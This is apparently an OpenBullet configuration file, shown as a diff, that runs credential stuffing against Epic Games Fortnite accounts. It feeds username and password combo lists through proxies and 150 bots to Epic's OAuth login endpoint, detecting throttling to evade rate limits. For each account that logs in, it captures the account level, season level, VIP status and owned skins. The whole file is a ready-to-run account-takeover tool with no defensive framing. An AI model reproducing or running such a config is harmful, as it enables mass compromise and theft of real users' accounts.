@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "Fortnite Api",
+  "SuggestedBots": 150,
+  "LastModified": "2018-08-26T00:27:00.1915427+02:00",
+  "AdditionalInfo": "",
+  "Author": "Burnwood",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token" AutoRedirect=FALSE 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>&includePerms=true&token_type=eg1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Authorization: basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry the account you are using is not active" 
+    KEY "Sorry the account credentials you are using are invalid" 
+    KEY "Please reset your password to proceed with login" 
+  KEYCHAIN Ban OR 
+    KEY "Operation access is limited by throttling policy" 
+#accesstoken PARSE "<SOURCE>" LR "\"access_token\" : \"" "\"" Recursive=FALSE -> VAR "accesstoken" "" "" 
+#redirecturltoken PARSE "<SOURCE>" LR "account_id\" : \"" "\"" Recursive=FALSE -> VAR "redirecturltoken" "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" "/client/QueryProfile?profileId=athena#26rvn=-1" 
+#red2 PARSE "<SOURCE>" LR "account_id\" : \"" "\"" Recursive=FALSE -> VAR "red2" "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" "/client/QueryProfile?profileId=common_core#26rvn=-1 " 
+REQUEST POST "<redirecturltoken>" AutoRedirect=FALSE 
+  CONTENT "{}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: bearer <accesstoken>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "does not posses the action" 
+  KEYCHAIN Success OR 
+    KEY "accountLevel\"" 
+    KEY "accountLevel\"" 
+    KEY "\"profileId\"" 
+#Season_Level PARSE "<SOURCE>" LR "seasonLevel\":" "," Recursive=TRUE -> CAP "Season Level" "" "" 
+#Account_Level PARSE "<SOURCE>" LR "accountLevel\":" "," Recursive=FALSE -> CAP "Account Level" "" "" 
+#VIP PARSE "<SOURCE>" LR "purchasedVIP\":" "}" Recursive=TRUE -> CAP "VIP" "" "" 
+#Skins PARSE "<SOURCE>" LR "{\"templateId\":\"AthenaCharacter:" "\",\"attributes\":{\"max_l" Recursive=TRUE -> CAP "" "" "" 
